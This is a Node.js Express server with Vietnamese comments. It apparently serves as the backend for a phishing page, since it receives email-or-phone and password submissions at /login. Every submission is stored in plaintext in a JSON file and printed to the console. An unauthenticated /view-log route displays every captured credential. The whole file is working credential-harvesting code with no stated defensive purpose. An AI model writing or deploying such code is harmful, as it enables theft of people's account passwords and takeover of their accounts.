const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const fs = require("fs"); // Import thư viện File System

const app = express();
const port = 3000;
const DATA_FILE = "loginData.json"; // File lưu thông tin đăng nhập

// Đọc dữ liệu từ file khi khởi động server
let loginData = [];
if (fs.existsSync(DATA_FILE)) {
  loginData = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Route POST để lưu thông tin đăng nhập vào mảng & file
app.post("/login", (req, res) => {
  const { emailOrPhone, password } = req.body;

  if (!emailOrPhone || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Vui lòng nhập đủ thông tin." });
  }

  const logEntry = {
    emailOrPhone: emailOrPhone,
    password: password,
    timestamp: new Date().toLocaleString(),
  };

  loginData.push(logEntry); // Lưu vào mảng
  fs.writeFileSync(DATA_FILE, JSON.stringify(loginData, null, 2)); // Lưu vào file

  console.log("Dữ liệu đã lưu:", logEntry);
  res.json({ success: true });
});

// Route GET để xem thông tin đăng nhập đã lưu
app.get("/view-log", (req, res) => {
  if (loginData.length === 0) {
    return res.status(404).send("<h1>Không có dữ liệu đăng nhập nào!</h1>");
  }

  let logEntries = loginData
    .map(
      (entry, index) =>
        `#${index + 1}\nEmail/Số điện thoại: ${entry.emailOrPhone}\nMật khẩu: ${
          entry.password
        }\nThời gian: ${entry.timestamp}`
    )
    .join("\n----------------------\n");

  res.send(`
    <html>
      <head>
        <title>Thông tin đăng nhập</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; }
          h1 { color: #333; }
          pre { background-color: #f4f4f4; padding: 20px; border-radius: 5px; }
        </style>
      </head>
      <body>
        <h1>Thông tin đăng nhập đã lưu</h1>
        <pre>${logEntries}</pre>
      </body>
    </html>
  `);
});

// Chạy server trên port 3000
app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
